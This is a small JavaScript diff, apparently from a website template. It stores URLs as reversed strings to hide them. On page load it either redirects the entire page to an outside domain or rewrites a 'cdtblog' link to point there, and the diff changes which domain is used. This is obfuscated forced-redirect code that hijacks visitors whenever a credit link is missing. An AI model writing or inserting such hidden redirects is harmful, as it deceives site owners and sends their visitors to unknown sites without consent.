@@ -66,7 +66,7 @@ function revs(a) {
 }
 
 window.onload = function() {
-    var a = revs("pot.yetadoc.www//:sptth"), b = revs("golbtdc");
+    var a = revs("moc.ofnitasabom.www//:sptth"), b = revs("golbtdc");
     b = document.getElementById(b);
     null == b && (window.location.href = a);
     b.setAttribute("href", a);
